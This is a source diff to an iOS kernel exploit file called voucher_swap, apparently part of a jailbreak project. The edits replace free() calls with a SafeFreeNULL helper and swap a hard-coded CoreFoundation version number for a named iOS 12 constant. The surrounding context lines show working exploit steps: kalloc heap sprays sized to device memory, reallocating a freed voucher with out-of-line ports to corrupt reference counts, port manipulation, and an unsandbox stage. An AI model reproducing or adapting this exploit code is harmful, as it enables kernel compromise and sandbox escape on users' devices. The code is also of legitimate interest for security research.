@@ -18,6 +18,7 @@
 #include "mach_vm.h"
 #include "parameters.h"
 #include "platform.h"
+#include "common.h"
 
 
 // ---- Global parameters -------------------------------------------------------------------------
@@ -194,7 +195,7 @@ voucher_spray_free(mach_port_t *voucher_ports, size_t count) {
 			mach_port_deallocate(mach_task_self(), voucher_ports[i]);
 		}
 	}
-	free(voucher_ports);
+	SafeFreeNULL(voucher_ports);
 }
 
 // ---- Helpers -----------------------------------------------------------------------------------
@@ -665,7 +666,7 @@ stage3_init(uint64_t ipc_space_kernel, uint64_t kernel_map) {
 	fake_port = MACH_PORT_NULL;
 	success = true;
 fail_1:
-	free(data);
+	SafeFreeNULL(data);
 fail_0:
 	return success;
 }
@@ -824,11 +825,11 @@ voucher_swap() {
 
 	// 6. Spray 15% of memory in kalloc.1024 that we can free later to
 	// prompt gc. We'll reuse some of the early ports from the port spray above for this.
-    const size_t gc_spray_size = (kCFCoreFoundationVersionNumber >= 1535.12 ? 0.15 : 0.10) * platform.memory_size;
+    const size_t gc_spray_size = (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_12_0 ? 0.15 : 0.10) * platform.memory_size;
 	printf("Spray size: %ld\n", gc_spray_size);
 	mach_port_t *gc_ports = filler_ports;
 	size_t gc_port_count = 500;        // Use at most 500 ports for the spray.
-    sprayed_size = kalloc_spray_size(gc_ports, &gc_port_count, (kCFCoreFoundationVersionNumber >= 1535.12 ? 768 : 300) + 1, 1024, gc_spray_size);
+    sprayed_size = kalloc_spray_size(gc_ports, &gc_port_count, (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_12_0 ? 768 : 300) + 1, 1024, gc_spray_size);
 	INFO("sprayed %zu bytes to %zu ports in kalloc.%u", sprayed_size, gc_port_count, 1024);
     
 	// 7. Stash a pointer to an ipc_voucher in the thread's ith_voucher field and then remove
@@ -881,7 +882,7 @@ voucher_swap() {
 	// kalloc.32768 zone. We need to do this slowly in order to force a zone garbage
 	// collection. Spraying 17% of memory (450 MB on the iPhone XR) with OOL ports should be
 	// plenty.
-    const size_t ool_ports_spray_size = (kCFCoreFoundationVersionNumber >= 1535.12 ? 0.25 : 0.085) * platform.memory_size;
+    const size_t ool_ports_spray_size = (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_12_0 ? 0.25 : 0.085) * platform.memory_size;
 	mach_port_t *ool_holding_ports = gc_ports + gc_port_count;
 	size_t ool_holding_port_count = 500;    // Use at most 500 ports for the spray.
 	sprayed_size = ool_ports_spray_size_with_gc(ool_holding_ports, &ool_holding_port_count,
@@ -890,7 +891,7 @@ voucher_swap() {
 			ool_ports_spray_size);
 	INFO("sprayed %zu bytes of OOL ports to %zu ports in kalloc.%zu",
 			sprayed_size, ool_holding_port_count, ool_port_spray_kalloc_zone);
-	free(ool_ports);
+	SafeFreeNULL(ool_ports);
 
 	// 12. Once we've reallocated the voucher with an OOL ports allocation, the iv_refs field
 	// will overlap with the lower 32 bits of the pointer to base_port. If base_port's address
@@ -1000,9 +1001,9 @@ voucher_swap() {
 	// ports, and close the sprayed pipes.
 	thread_terminate(thread);
 	destroy_ports(filler_ports, filler_port_count);
-	free(filler_ports);
+	SafeFreeNULL(filler_ports);
 	close_pipes(pipefds_array, pipe_count);
-	free(pipefds_array);
+	SafeFreeNULL(pipefds_array);
 
 	// 17. Use mach_port_request_notification() to put a pointer to an array containing
 	// base_port in our port's ip_requests field.
@@ -1138,7 +1139,7 @@ voucher_swap() {
 
 	// 29. And finally, deallocate the remaining unneeded (but non-corrupted) resources.
 	pipe_close(pipefds);
-	free(pipe_buffer);
+	SafeFreeNULL(pipe_buffer);
 	mach_port_destroy(mach_task_self(), base_port);
     
     // 30. Unsandbox
